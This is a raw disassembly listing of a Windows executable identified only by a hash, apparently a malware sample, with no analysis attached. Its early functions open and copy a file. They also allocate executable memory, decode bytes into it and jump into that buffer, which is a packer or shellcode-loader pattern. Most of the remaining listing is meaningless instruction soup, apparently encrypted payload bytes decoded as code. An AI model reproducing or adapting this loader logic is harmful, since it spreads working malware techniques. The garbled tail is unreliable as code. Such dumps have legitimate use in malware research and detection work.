
dbe34f3ceff388a6f27f8e70e6ad8b98d95d5a4b73dba9cfd4817add5e012776.exe:     file format pei-i386


Disassembly of section .text:

00411000 <.text>:
  411000:	sub    esp,0xf8
  411006:	push   esi
  411007:	mov    esi,DWORD PTR ds:0x42901c
  41100d:	push   edi
  41100e:	push   0x0
  411010:	push   0x80
  411015:	push   0x3
  411017:	push   0x0
  411019:	push   0x0
  41101b:	push   0x80000000
  411020:	push   0x4291e8
  411025:	call   esi
  411027:	mov    edi,eax
  411029:	cmp    edi,0xffffffff
  41102c:	mov    DWORD PTR [esp+0xc],edi
  411030:	je     0x41115f
  411036:	push   0x0
  411038:	push   0x80
  41103d:	push   0x4
  41103f:	push   0x0
  411041:	push   0x1
  411043:	push   0x4
  411045:	push   0x4291e0
  41104a:	call   esi
  41104c:	mov    esi,eax
  41104e:	cmp    esi,0xffffffff
  411051:	jne    0x411061
  411053:	pop    edi
  411054:	mov    eax,0x1
  411059:	pop    esi
  41105a:	add    esp,0xf8
  411060:	ret    
  411061:	push   ebx
  411062:	mov    ebx,DWORD PTR ds:0x429018
  411068:	push   ebp
  411069:	mov    ebp,DWORD PTR ds:0x429014
  41106f:	nop
  411070:	push   0x0
  411072:	lea    eax,[esp+0x14]
  411076:	push   eax
  411077:	push   0xc8
  41107c:	lea    ecx,[esp+0x4c]
  411080:	push   ecx
  411081:	push   edi
  411082:	call   DWORD PTR ds:0x429010
  411088:	test   eax,eax
  41108a:	je     0x4110d1
  41108c:	push   0x2
  41108e:	push   0x0
  411090:	push   0x0
  411092:	push   esi
  411093:	call   ebx
  411095:	mov    edx,DWORD PTR [esp+0x10]
  411099:	push   0x0
  41109b:	push   edx
  41109c:	push   0x0
  41109e:	mov    edi,eax
  4110a0:	push   edi
  4110a1:	push   esi
  4110a2:	call   ebp
  4110a4:	mov    ecx,DWORD PTR [esp+0x10]
  4110a8:	push   0x0
  4110aa:	lea    eax,[esp+0x1c]
  4110ae:	push   eax
  4110af:	push   ecx
  4110b0:	lea    edx,[esp+0x4c]
  4110b4:	push   edx
  4110b5:	push   esi
  4110b6:	call   DWORD PTR ds:0x42902c
  4110bc:	mov    eax,DWORD PTR [esp+0x10]
  4110c0:	push   0x0
  4110c2:	push   eax
  4110c3:	push   0x0
  4110c5:	push   edi
  4110c6:	push   esi
  4110c7:	call   DWORD PTR ds:0x429040
  4110cd:	mov    edi,DWORD PTR [esp+0x14]
  4110d1:	cmp    DWORD PTR [esp+0x10],0xc8
  4110d9:	je     0x411070
  4110db:	push   edi
  4110dc:	mov    edi,DWORD PTR ds:0x429044
  4110e2:	call   edi
  4110e4:	push   esi
  4110e5:	call   edi
  4110e7:	lea    ecx,[esp+0x1c]
  4110eb:	push   ecx
  4110ec:	call   DWORD PTR ds:0x42904c
  4110f2:	mov    ecx,DWORD PTR [esp+0x38]
  4110f6:	xor    edx,edx
  4110f8:	mov    eax,0x21c00
  4110fd:	div    ecx
  4110ff:	mov    edi,DWORD PTR ds:0x42911c
  411105:	lea    edx,[esp+0x40]
  411109:	mov    ebx,ecx
  41110b:	mov    esi,eax
  41110d:	imul   esi,ecx
  411110:	push   esi
  411111:	push   0x4291a8
  411116:	push   edx
  411117:	call   edi
  411119:	xor    edx,edx
  41111b:	mov    eax,0x21c00
  411120:	div    ebx
  411122:	lea    eax,[esp+0x4c]
  411126:	add    edx,0x400
  41112c:	push   edx
  41112d:	push   0x429180
  411132:	push   eax
  411133:	call   edi
  411135:	push   0x22000
  41113a:	lea    ecx,[esp+0x5c]
  41113e:	push   0x429150
  411143:	push   ecx
  411144:	call   edi
  411146:	mov    edx,0x21c00
  41114b:	sub    edx,esi
  41114d:	push   edx
  41114e:	lea    eax,[esp+0x68]
  411152:	push   0x429128
  411157:	push   eax
  411158:	call   edi
  41115a:	add    esp,0x30
  41115d:	pop    ebp
  41115e:	pop    ebx
  41115f:	pop    edi
  411160:	xor    eax,eax
  411162:	pop    esi
  411163:	add    esp,0xf8
  411169:	ret    
  41116a:	nop
  41116b:	nop
  41116c:	nop
  41116d:	nop
  41116e:	nop
  41116f:	nop
  411170:	sub    esp,0x8
  411173:	push   ebx
  411174:	push   ebp
  411175:	mov    ebp,DWORD PTR [esp+0x20]
  411179:	push   esi
  41117a:	xor    eax,eax
  41117c:	push   edi
  41117d:	mov    edi,DWORD PTR [esp+0x1c]
  411181:	mov    DWORD PTR [esp+0x10],eax
  411185:	mov    esi,0xfffffffd
  41118a:	mov    DWORD PTR [esp+0x14],0x1
  411192:	mov    ecx,DWORD PTR [esp+0x20]
  411196:	mov    cl,BYTE PTR [ecx+esi*1+0x3]
  41119a:	add    esi,0x2
  41119d:	inc    esi
  41119e:	mov    BYTE PTR [esi+edi*1],cl
  4111a1:	movzx  edx,BYTE PTR [eax+ebp*1]
  4111a5:	mov    eax,DWORD PTR [esp+0x10]
  4111a9:	mov    ecx,DWORD PTR [esp+0x14]
  4111ad:	add    eax,ecx
  4111af:	mov    DWORD PTR [esp+0x10],eax
  4111b3:	shr    eax,cl
  4111b5:	mov    eax,DWORD PTR [esp+0x10]
  4111b9:	mov    ecx,eax
  4111bb:	shr    ecx,0x3
  4111be:	mov    ebx,0x1
  4111c3:	sub    ebx,ecx
  4111c5:	imul   eax,ebx
  4111c8:	mov    DWORD PTR [esp+0x10],eax
  4111cc:	shl    ebx,0x3
  4111cf:	mov    bl,BYTE PTR [esi+edi*1]
  4111d2:	mov    ecx,DWORD PTR [esp+0x24]
  4111d6:	add    bl,dl
  4111d8:	mov    BYTE PTR [esi+edi*1],bl
  4111db:	sub    esi,0x2
  4111de:	cmp    esi,ecx
  4111e0:	jl     0x411192
  4111e2:	pop    edi
  4111e3:	pop    esi
  4111e4:	pop    ebp
  4111e5:	pop    ebx
  4111e6:	add    esp,0x8
  4111e9:	ret    
  4111ea:	nop
  4111eb:	nop
  4111ec:	nop
  4111ed:	nop
  4111ee:	nop
  4111ef:	nop
  4111f0:	push   ebp
  4111f1:	mov    ebp,esp
  4111f3:	sub    esp,0x70
  4111f6:	mov    DWORD PTR [ebp-0x48],0x0
  4111fd:	mov    DWORD PTR [ebp-0x18],0x0
  411204:	mov    DWORD PTR [ebp-0x70],0x0
  41120b:	mov    DWORD PTR [ebp-0x60],0x0
  411212:	mov    DWORD PTR [ebp-0x8],0x0
  411219:	mov    DWORD PTR [ebp-0x6c],0x0
  411220:	mov    DWORD PTR [ebp-0x68],0x0
  411227:	mov    DWORD PTR [ebp-0x14],0x0
  41122e:	mov    DWORD PTR [ebp-0x4c],0x0
  411235:	mov    DWORD PTR [ebp-0x10],0x0
  41123c:	mov    DWORD PTR [ebp-0x58],0x0
  411243:	mov    DWORD PTR [ebp-0x4],0x0
  41124a:	mov    DWORD PTR [ebp-0x5c],0x0
  411251:	mov    DWORD PTR [ebp-0x30],0x0
  411258:	mov    DWORD PTR [ebp-0x54],0x0
  41125f:	mov    DWORD PTR [ebp-0x2c],0x0
  411266:	mov    DWORD PTR [ebp-0x50],0x0
  41126d:	mov    DWORD PTR [ebp-0xc],0x0
  411274:	mov    eax,ds:0x429214
  411279:	mov    DWORD PTR [ebp-0x28],eax
  41127c:	mov    ecx,DWORD PTR ds:0x429218
  411282:	mov    DWORD PTR [ebp-0x24],ecx
  411285:	mov    edx,DWORD PTR ds:0x42921c
  41128b:	mov    DWORD PTR [ebp-0x20],edx
  41128e:	mov    al,ds:0x429220
  411293:	mov    BYTE PTR [ebp-0x1c],al
  411296:	mov    ecx,DWORD PTR ds:0x429204
  41129c:	mov    DWORD PTR [ebp-0x40],ecx
  41129f:	mov    edx,DWORD PTR ds:0x429208
  4112a5:	mov    DWORD PTR [ebp-0x3c],edx
  4112a8:	mov    eax,ds:0x42920c
  4112ad:	mov    DWORD PTR [ebp-0x38],eax
  4112b0:	mov    cx,WORD PTR ds:0x429210
  4112b7:	mov    WORD PTR [ebp-0x34],cx
  4112bb:	mov    dl,BYTE PTR ds:0x429212
  4112c1:	mov    BYTE PTR [ebp-0x32],dl
  4112c4:	mov    DWORD PTR [ebp-0x30],0x40
  4112cb:	lea    eax,[ebp-0x10]
  4112ce:	push   eax
  4112cf:	push   0x4291f0
  4112d4:	call   DWORD PTR ds:0x429008
  4112da:	test   eax,eax
  4112dc:	je     0x411338
  4112de:	lea    ecx,[ebp-0x40]
  4112e1:	push   ecx
  4112e2:	lea    edx,[ebp-0x10]
  4112e5:	push   edx
  4112e6:	call   DWORD PTR ds:0x429000
  4112ec:	test   eax,eax
  4112ee:	je     0x411338
  4112f0:	push   0x0
  4112f2:	push   0x0
  4112f4:	push   0x0
  4112f6:	call   DWORD PTR ds:0x429034
  4112fc:	mov    DWORD PTR [ebp-0x14],eax
  4112ff:	mov    eax,DWORD PTR [ebp-0x10]
  411302:	add    eax,0x1
  411305:	mov    DWORD PTR [ebp-0x10],eax
  411308:	push   0x14
  41130a:	push   0x0
  41130c:	mov    ecx,DWORD PTR [ebp-0x14]
  41130f:	push   ecx
  411310:	call   DWORD PTR ds:0x429030
  411316:	lea    edx,[ebp-0x50]
  411319:	push   edx
  41131a:	push   0x0
  41131c:	push   0x0
  41131e:	push   0x0
  411320:	mov    eax,DWORD PTR [ebp-0x50]
  411323:	push   eax
  411324:	call   DWORD PTR ds:0x429004
  41132a:	push   0x0
  41132c:	push   0x0
  41132e:	mov    ecx,DWORD PTR [ebp-0x14]
  411331:	push   ecx
  411332:	call   DWORD PTR ds:0x429048
  411338:	call   DWORD PTR ds:0x429028
  41133e:	mov    DWORD PTR [ebp-0x2c],eax
  411341:	movzx  edx,WORD PTR [ebp-0x2c]
  411345:	cmp    edx,0x539
  41134b:	jne    0x41137c
  41134d:	mov    DWORD PTR [ebp-0x14],0xe0d
  411354:	lea    eax,[ebp-0x28]
  411357:	push   eax
  411358:	call   DWORD PTR ds:0x429024
  41135e:	mov    DWORD PTR [ebp-0x60],eax
  411361:	mov    DWORD PTR [ebp-0x54],0x3a
  411368:	mov    BYTE PTR [ebp-0x34],0x0
  41136c:	mov    DWORD PTR [ebp-0x8],0x780e435e
  411373:	mov    DWORD PTR [ebp-0x68],0x10d93f
  41137a:	jmp    0x411391
  41137c:	mov    BYTE PTR ds:0x444a58,0x0
  411383:	mov    BYTE PTR ds:0x42cb88,0x0
  41138a:	mov    BYTE PTR ds:0x442b18,0x0
  411391:	mov    DWORD PTR [ebp-0x2c],0x410000
  411398:	push   DWORD PTR ds:0x429024
  41139e:	pop    edx
  41139f:	mov    DWORD PTR [ebp-0x6c],edx
  4113a2:	lea    ecx,[ebp-0x40]
  4113a5:	push   ecx
  4113a6:	mov    edx,DWORD PTR [ebp-0x60]
  4113a9:	push   edx
  4113aa:	call   DWORD PTR ds:0x429020
  4113b0:	mov    DWORD PTR [ebp-0x44],eax
  4113b3:	push   DWORD PTR [ebp-0x30]
  4113b6:	push   0x1000
  4113bb:	mov    eax,DWORD PTR [ebp-0x14]
  4113be:	add    eax,0x23
  4113c1:	add    eax,0x23
  4113c4:	push   eax
  4113c5:	xor    eax,eax
  4113c7:	push   eax
  4113c8:	mov    ecx,DWORD PTR [ebp-0x44]
  4113cb:	call   ecx
  4113cd:	push   eax
  4113ce:	pop    ecx
  4113cf:	mov    DWORD PTR [ebp-0x4],ecx
  4113d2:	mov    eax,DWORD PTR [ebp-0x68]
  4113d5:	sub    eax,0xdae0b
  4113da:	mov    DWORD PTR [ebp-0x68],eax
  4113dd:	cmp    DWORD PTR [ebp-0x4],0x0
  4113e1:	jne    0x4113ea
  4113e3:	mov    BYTE PTR ds:0x442b18,0x0
  4113ea:	mov    ecx,DWORD PTR [ebp-0x4]
  4113ed:	add    ecx,DWORD PTR [ebp-0x14]
  4113f0:	mov    edx,DWORD PTR [ebp-0x8]
  4113f3:	mov    DWORD PTR [ecx],edx
  4113f5:	mov    eax,DWORD PTR [ebp-0x4]
  4113f8:	add    eax,DWORD PTR [ebp-0x54]
  4113fb:	mov    DWORD PTR [ebp-0x5c],eax
  4113fe:	mov    ecx,DWORD PTR ds:0x429020
  411404:	mov    DWORD PTR [ebp-0x4c],ecx
  411407:	mov    edx,DWORD PTR [ebp-0x4]
  41140a:	add    edx,DWORD PTR [ebp-0x14]
  41140d:	mov    eax,DWORD PTR [ebp+0x8]
  411410:	mov    DWORD PTR [edx+0x4],eax
  411413:	mov    ecx,DWORD PTR [ebp-0x4]
  411416:	add    ecx,DWORD PTR [ebp-0x14]
  411419:	mov    DWORD PTR [ebp-0xc],ecx
  41141c:	cmp    DWORD PTR [ebp-0x68],0x0
  411420:	jbe    0x41143d
  411422:	mov    edx,DWORD PTR [ebp-0xc]
  411425:	push   edx
  411426:	mov    eax,DWORD PTR [ebp-0x14]
  411429:	push   eax
  41142a:	mov    ecx,DWORD PTR [ebp-0x2c]
  41142d:	add    ecx,DWORD PTR [ebp-0x68]
  411430:	push   ecx
  411431:	mov    edx,DWORD PTR [ebp-0x4]
  411434:	push   edx
  411435:	call   0x411170
  41143a:	add    esp,0x10
  41143d:	cmp    DWORD PTR [ebp-0x5c],0x0
  411441:	je     0x411454
  411443:	push   DWORD PTR [ebp-0x4c]
  411446:	push   DWORD PTR [ebp-0x6c]
  411449:	mov    edx,DWORD PTR [ebp-0x5c]
  41144c:	push   eax
  41144d:	jmp    edx
  41144f:	jmp    0x422f29
  411454:	mov    eax,DWORD PTR [ebp+0x8]
  411457:	mov    DWORD PTR [ebp-0x18],eax
  41145a:	test   eax,0x7866ce04
  41145f:	call   0x27e0:0x395cb0c6
  411466:	push   0x9dc7cc2e
  41146b:	sub    eax,esp
  41146d:	sub    esi,DWORD PTR ds:[esi+0x33]
  411471:	add    BYTE PTR [ebp*8+0x121d8ab5],ch
  411478:	shl    DWORD PTR [ecx],1
  41147a:	and    ebp,ebx
  41147c:	push   cs
  41147d:	xchg   esi,eax
  41147e:	test   BYTE PTR [ebp+0x34fb6a12],bh
  411484:	mov    cl,0xd5
  411486:	jbe    0x4114cc
  411488:	in     al,dx
  411489:	jno    0x411471
  41148b:	lods   eax,DWORD PTR ds:[esi]
  41148c:	dec    edi
  41148d:	dec    eax
  41148e:	sahf   
  41148f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411490:	jg     0x411490
  411492:	xlat   BYTE PTR ds:[ebx]
  411493:	sbb    BYTE PTR [ebp-0x64f82fa2],0xd1
  41149a:	int    0x96
  41149c:	data16 cs (bad) 
  41149f:	add    bl,BYTE PTR es:[si-0x72]
  4114a4:	add    eax,0x2373c8d
  4114a9:	push   cs
  4114aa:	jge    0x4114cc
  4114ac:	fsubr  DWORD PTR [ecx-0x6d]
  4114af:	in     al,dx
  4114b0:	(bad)  
  4114b1:	retf   0xd101
  4114b4:	loope  0x41146b
  4114b6:	into   
  4114b7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4114b8:	jge    0x411451
  4114ba:	pop    ds
  4114bb:	mov    bh,ah
  4114bd:	mov    gs,eax
  4114bf:	xchg   DWORD PTR [edi-0x49],ebp
  4114c2:	cmp    DWORD PTR [ebx-0x6a],edx
  4114c5:	sub    bl,BYTE PTR [edx]
  4114c7:	pop    esi
  4114c8:	lock stos DWORD PTR es:[edi],eax
  4114ca:	xchg   esi,eax
  4114cb:	in     eax,dx
  4114cc:	push   es
  4114cd:	rcr    ah,cl
  4114cf:	add    ebp,DWORD PTR [ecx+0x6b]
  4114d2:	mov    BYTE PTR [eax-0x37],bl
  4114d5:	or     eax,0xcc1c32b7
  4114da:	ss xchg edi,eax
  4114dc:	mov    es:0x2d7c97a,al
  4114e2:	xor    bl,dl
  4114e4:	push   ss
  4114e5:	leave  
  4114e6:	push   ecx
  4114e7:	add    al,0x58
  4114e9:	repnz repz fidiv WORD PTR [ebx]
  4114ed:	les    edx,FWORD PTR [edx-0x50b344d2]
  4114f3:	icebp  
  4114f4:	call   0xd90b66e9
  4114f9:	xlat   BYTE PTR ds:[ebx]
  4114fa:	(bad)  
  4114fb:	push   edx
  4114fc:	pop    ss
  4114fd:	sub    eax,0x3efa2896
  411502:	or     DWORD PTR [eiz*1+0x77a48c65],edi
  411509:	jae    0x411510
  41150b:	jns    0x4114e6
  41150d:	frstor [esi-0x79]
  411510:	pop    ecx
  411512:	xor    al,0xa
  411514:	add    al,0xeb
  411516:	dec    eax
  411517:	repnz mov dl,0x95
  41151a:	hlt    
  41151b:	push   edx
  41151c:	push   0xfffffff2
  41151e:	dec    ebp
  41151f:	mul    bh
  411521:	(bad)  
  411522:	dec    esi
  411523:	and    eax,0x6535df1a
  411528:	jecxz  0x4114e5
  41152a:	fdiv   DWORD PTR [ebx+0x1e]
  41152d:	stos   DWORD PTR es:[edi],eax
  41152e:	inc    ebx
  41152f:	and    eax,0x2f2cd89b
  411534:	xlat   BYTE PTR ds:[ebx]
  411535:	mov    ah,0xf2
  411537:	or     BYTE PTR fs:[esi],0x86
  41153b:	aas    
  41153c:	fild   DWORD PTR [ebx+0x2e460e00]
  411542:	push   edi
  411543:	shr    BYTE PTR [edx+0x7],cl
  411546:	xchg   ebx,eax
  411547:	in     al,0xe1
  411549:	sub    eax,0xd4023f40
  41154e:	stc    
  41154f:	inc    ebx
  411550:	stc    
  411551:	inc    ebp
  411552:	fucomp st(6)
  411554:	xchg   BYTE PTR [eax],cl
  411556:	xor    eax,0x8f8a2c9e
  41155b:	and    BYTE PTR [edi],bh
  41155d:	adc    eax,0xc040bc85
  411562:	shl    bh,1
  411564:	fs mov bh,0x39
  411567:	test   DWORD PTR [ecx-0x4ff20f09],0xa907bb30
  411571:	mov    esp,0x66e307e0
  411576:	mov    dh,0xf8
  411578:	leave  
  411579:	inc    eax
  41157a:	and    DWORD PTR [edi*1-0x4f5d2f75],ebp
  411581:	push   ds
  411582:	pusha  
  411583:	(bad)
  411587:	or     eax,0xab1728a7
  41158c:	pop    edi
  41158d:	jge    0x4115d0
  41158f:	cmp    eax,0x1f41b6b0
  411594:	inc    eax
  411595:	lds    ebp,FWORD PTR [edx+0xa]
  411598:	add    ebp,DWORD PTR [ecx]
  41159a:	and    bl,0x51
  41159d:	xchg   edx,eax
  41159e:	bound  esi,QWORD PTR [edi]
  4115a0:	jecxz  0x41152d
  4115a2:	cmp    edi,ebx
  4115a4:	jo     0x411610
  4115a6:	lea    esp,[edx+0xb]
  4115a9:	lea    edx,[ecx]
  4115ab:	retf   
  4115ac:	cmp    DWORD PTR [ecx-0x54],esi
  4115af:	xchg   esi,eax
  4115b0:	cli    
  4115b1:	dec    DWORD PTR [ebp-0x23]
  4115b4:	or     al,dl
  4115b6:	jecxz  0x4115d6
  4115b8:	call   0xdbfba4f1
  4115bd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4115be:	sti    
  4115bf:	ret    0x557c
  4115c2:	ret    0x9ae2
  4115c5:	ins    DWORD PTR es:[edi],dx
  4115c6:	mov    es,WORD PTR [esi-0x7a0116d0]
  4115cc:	mov    esp,0xaea3290
  4115d1:	das    
  4115d2:	push   ss
  4115d3:	fcmovb st,st(2)
  4115d5:	and    ah,ah
  4115d7:	lea    esp,ds:0x3c6ddb48
  4115dd:	daa    
  4115de:	and    ebx,edi
  4115e0:	mov    ecx,0x2412b6c8
  4115e5:	mov    edx,0x75008389
  4115ea:	sbb    bl,dl
  4115ec:	push   ss
  4115ed:	repnz scas al,BYTE PTR es:[edi]
  4115ef:	cmp    BYTE PTR [edi-0x44],0x29
  4115f3:	and    dh,BYTE PTR [esi-0x40c1b48d]
  4115f9:	adc    ch,dl
  4115fb:	(bad)  
  4115fc:	loop   0x411641
  4115fe:	sbb    eax,0x1cace0c3
  411603:	add    DWORD PTR [bp+si+0x67c3],0xffffffd5
  411609:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41160a:	stc    
  41160b:	push   ds
  41160c:	mov    ?,edi
  41160e:	jns    0x4115a4
  411610:	retf   
  411611:	fmul   st,st(7)
  411613:	or     al,BYTE PTR [ecx]
  411615:	jg     0x41162f
  411617:	retf   0xa5de
  41161a:	addr16 test eax,0x88a4aa41
  411620:	pop    ebx
  411621:	fs jns 0x4115b2
  411624:	pop    ds
  411625:	gs retf 
  411627:	inc    edi
  411628:	inc    esp
  411629:	popa   
  41162a:	lahf   
  41162b:	aam    0x2
  41162d:	mov    esp,0x6ed79d7a
  411632:	call   0xf732:0xaf53dc3c
  411639:	data16 or al,0x3c
  41163c:	dec    esi
  41163d:	jmp    0x4115dd
  41163f:	cs iret 
  411641:	fistp  QWORD PTR [edx-0x234a4438]
  411647:	push   0xffffffb8
  411649:	mov    dl,0x14
  41164b:	inc    eax
  41164c:	mov    edi,edx
  41164e:	in     eax,0x12
  411650:	cmp    BYTE PTR ds:0x3b91,bh
  411655:	jge    0x4115fe
  411657:	add    DWORD PTR [esp+eax*4-0x1006840d],esi
  41165e:	in     al,dx
  41165f:	inc    esp
  411660:	and    dh,BYTE PTR [ecx+0x24]
  411663:	adc    eax,0x9e8d348e
  411668:	pop    eax
  411669:	dec    esi
  41166a:	xchg   BYTE PTR [edi],ah
  41166c:	mov    ah,0xcf
  41166e:	mov    edx,DWORD PTR [esi]
  411670:	(bad)  [ebp+0x49]
  411673:	mov    ecx,ebp
  411675:	mov    DWORD PTR [ecx],0x8c5a5499
  41167b:	enter  0x7a39,0x8
  41167f:	dec    esi
  411680:	fld    TBYTE PTR [ebx+0x24]
  411683:	lds    ebp,FWORD PTR [ecx+0x20cf8aa2]
  411689:	mov    eax,ds:0x3fc355dc
  41168e:	dec    edi
  41168f:	dec    eax
  411690:	int3   
  411691:	icebp  
  411692:	int    0x7e
  411694:	add    al,0xed
  411696:	idiv   DWORD PTR [ebp+ebx*1-0x10026336]
  41169d:	jo     0x41163b
  41169f:	pusha  
  4116a0:	lea    ebp,[ebx+ebx*8+0x2eafd2c]
  4116a7:	push   edi
  4116a8:	or     eax,0x80c4e540
  4116ad:	cwde   
  4116ae:	daa    
  4116af:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4116b0:	(bad)  [edi-0x14d58fd7]
  4116b6:	xor    eax,0x3e90f920
  4116bb:	mov    fs,WORD PTR [ebp-0x5b6e3be6]
  4116c1:	dec    edi
  4116c2:	xor    al,0xc4
  4116c4:	inc    ecx
  4116c5:	xor    eax,0x78aab23e
  4116ca:	sbb    eax,0x937353d2
  4116cf:	adc    DWORD PTR [ecx],ecx
  4116d1:	dec    esp
  4116d2:	add    al,0x24
  4116d4:	inc    eax
  4116d5:	mov    eax,0x815da613
  4116da:	ror    BYTE PTR [ecx],0x4c
  4116dd:	sbb    eax,0x6381663e
  4116e2:	mov    gs,WORD PTR [edi]
  4116e4:	ret    0x9664
  4116e7:	mov    edi,0xcdb8c3f9
  4116ec:	test   dl,al
  4116ee:	jb     0x411703
  4116f0:	out    0xfd,al
  4116f2:	jp     0x411734
  4116f4:	stos   BYTE PTR es:[edi],al
  4116f5:	and    DWORD PTR [ebp+0x2a],ecx
  4116f8:	lock out 0x80,al
  4116fb:	leave  
  4116fc:	fst    DWORD PTR [ecx-0x4b770833]
  411702:	cmp    BYTE PTR [edx-0xf],0xf
  411706:	pop    ebp
  411707:	add    eax,0x2ec7028a
  41170c:	jmp    esp
  41170e:	or     dl,ch
  411710:	xchg   edi,eax
  411711:	enter  0x7636,0x98
  411715:	jmp    0x1729:0x4680eaa9
  41171c:	jnp    0x411749
  41171e:	jb     0x41170b
  411720:	neg    bl
  411722:	jle    0x411781
  411724:	and    DWORD PTR [edx+eax*1],edi
  411727:	ss xor al,0xbf
  41172a:	push   esp
  41172b:	call   0x8c5b58db
  411730:	push   es
  411731:	push   0x7da8a84d
  411736:	js     0x411764
  411738:	fsub   st,st(0)
  41173a:	pop    eax
  41173b:	mov    ecx,0x682fc4a3
  411740:	js     0x4117b0
  411742:	scas   al,BYTE PTR es:[edi]
  411743:	out    0x48,al
  411745:	and    eax,0xc9465bb2
  41174a:	es sbb al,0x10
  41174d:	arpl   WORD PTR [ebp+ebp*2+0x50],ax
  411751:	mov    esp,0xbec2bde0
  411756:	test   al,ch
  411758:	inc    edi
  411759:	out    0x10,eax
  41175b:	and    bl,al
  41175d:	cmp    eax,0x42d892bd
  411762:	mov    ds:0x5d548782,eax
  411767:	jp     0x4117d2
  411769:	mov    dh,BYTE PTR [ecx]
  41176b:	and    eax,0x3cdff061
  411770:	test   DWORD PTR [ebx-0x18],ebp
  411773:	mov    ecx,0x1421875a
  411778:	sub    esi,ecx
  41177a:	and    ebp,DWORD PTR [ecx-0x222213c9]
  411780:	cdq    
  411781:	mov    edx,0x60507d5b
  411786:	jg     0x41174a
  411788:	hlt    
  411789:	rep outs dx,DWORD PTR ds:[esi]
  41178b:	push   ds
  41178c:	xchg   edx,eax
  41178d:	sti    
  41178e:	fidivr DWORD PTR ds:0x455e06c
  411794:	test   al,0x26
  411796:	cmp    esi,0xfe7b84cb
  41179c:	jg     0x411728
  41179e:	ds dec esp
  4117a0:	mov    ebp,0x99c65553
  4117a5:	cmp    DWORD PTR [ebx],ebp
  4117a7:	mov    ds:0x6048d8e8,eax
  4117ac:	xchg   ebx,eax
  4117ad:	cli    
  4117ae:	stos   BYTE PTR es:[edi],al
  4117af:	push   edx
  4117b0:	sbb    DWORD PTR [edx-0x5c48ab3b],edx
  4117b6:	sub    eax,0x42cb939b
  4117bb:	cwde   
  4117bc:	out    0x68,eax
  4117be:	xor    edi,ebx
  4117c0:	aas    
  4117c1:	mov    esp,ebx
  4117c3:	push   edx
  4117c4:	test   DWORD PTR [edi-0x256ad215],ebx
  4117ca:	call   0x9986:0xe0e13153
  4117d1:	call   0xc93d:0xc2cf1c52
  4117d8:	sbb    BYTE PTR [edx+0x5a],0xe3
  4117dc:	fisttp WORD PTR [esi+0x5468a449]
  4117e2:	add    DWORD PTR [eax-0x1f],ebp
  4117e5:	cmp    DWORD PTR [esi+0x591ef19f],eax
  4117eb:	hlt    
  4117ec:	ret    0x867b
  4117ef:	(bad)  
  4117f0:	sub    eax,0xb5670a65
  4117f5:	aad    0xef
  4117f7:	push   edi
  4117f8:	invd   
  4117fa:	xchg   ebp,eax
  4117fb:	mov    ebp,ebp
  4117fd:	hlt    
  4117fe:	cwde   
  4117ff:	xchg   edi,eax
  411800:	pop    edi
  411801:	or     DWORD PTR [edi],ebx
  411803:	add    ebx,eax
  411805:	pop    ebp
  411806:	jp     0x411884
  411808:	mov    bl,0x8d
  41180a:	(bad)  
  41180b:	stc    
  41180c:	sar    DWORD PTR [esi+0x32],0x56
  411810:	(bad)
  411813:	mov    dl,0xe2
  411815:	(bad)  
  411817:	or     DWORD PTR [esi-0x2663eeaf],eax
  41181d:	mov    ebx,0xdd487035
  411822:	ss jp  0x411861
  411825:	jp     0x411867
  411827:	and    esi,DWORD PTR [eax-0x6786fc35]
  41182d:	and    DWORD PTR [edx+ecx*2-0x2a115038],esi
  411834:	out    dx,al
  411835:	pop    eax
  411836:	lods   eax,DWORD PTR ds:[esi]
  411837:	daa    
  411838:	adc    al,0x69
  41183a:	les    ebx,FWORD PTR ds:0x9c031b5
  411840:	cmp    dl,BYTE PTR [edi+0x5]
  411843:	cdq    
  411844:	jne    0x4118b2
  411846:	pop    esi
  411847:	ret    
  411848:	outs   dx,DWORD PTR ds:[esi]
  411849:	fiadd  WORD PTR ds:0xd77f17af
  41184f:	mov    dh,BYTE PTR [esi+0x1d]
  411852:	or     dh,BYTE PTR [edi+0x5327c431]
  411858:	fwait
  411859:	ins    DWORD PTR es:[edi],dx
  41185a:	xor    BYTE PTR [ecx+0x7ea3f115],dl
  411860:	mov    BYTE PTR [edx+0x33],bh
  411863:	mov    eax,0xe0693f4c
  411868:	xchg   ebp,eax
  411869:	mov    al,0x24
  41186b:	popf   
  41186c:	and    DWORD PTR [ebp+0x56022f31],0x76
  411873:	mov    edi,0xbb70a288
  411878:	fidiv  WORD PTR [ecx]
  41187a:	inc    edx
  41187b:	or     edx,DWORD PTR [ebp+0x55e96e6d]
  411881:	adc    cl,0xcb
  411884:	scas   al,BYTE PTR es:[edi]
  411885:	mov    ebx,edi
  411887:	fmul   DWORD PTR [edx]
  411889:	adc    DWORD PTR [edi+0x2f],0xffffffc4
  41188d:	dec    ecx
  41188e:	sbb    eax,0xe5b98022
  411893:	and    edi,DWORD PTR [edx+0x1d7a98b0]
  411899:	xor    cl,BYTE PTR [ecx]
  41189b:	push   edx
  41189c:	(bad)  
  41189d:	jecxz  0x41186e
  41189f:	mov    ebx,ebp
  4118a1:	mov    eax,0xd39d2318
  4118a6:	xchg   BYTE PTR [ebx+0x1a],ah
  4118a9:	je     0x411883
  4118ab:	dec    edx
  4118ac:	cmp    DWORD PTR [ebx-0x4df163d2],ebx
  4118b2:	in     al,dx
  4118b3:	dec    ebp
  4118b4:	sbb    esi,DWORD PTR [esi]
  4118b6:	enter  0xcb0c,0xb
  4118ba:	sbb    ah,BYTE PTR [ecx-0x10]
  4118bd:	mov    WORD PTR [ebp-0xf],?
  4118c0:	mov    eax,DWORD PTR [ecx-0x7b28cf26]
  4118c6:	mov    bl,0x6b
  4118c8:	xor    ecx,DWORD PTR [eax]
  4118ca:	test   eax,0x33447b41
  4118cf:	aam    0x31
  4118d1:	xor    DWORD PTR ds:0x957fd99,0x6aaa3b4a
  4118db:	push   ebp
  4118dc:	test   ch,ch
  4118de:	aad    0x59
  4118e0:	sbb    al,0x2e
  4118e2:	dec    ebp
  4118e3:	(bad)  
  4118e4:	sbb    al,0x39
  4118e6:	idiv   BYTE PTR [edi]
  4118e8:	mov    bl,0xc1
  4118ea:	ror    dl,cl
  4118ec:	pop    ebx
  4118ed:	scas   al,BYTE PTR es:[edi]
  4118ee:	sti    
  4118ef:	adc    ah,BYTE PTR ds:0x2c19a15b
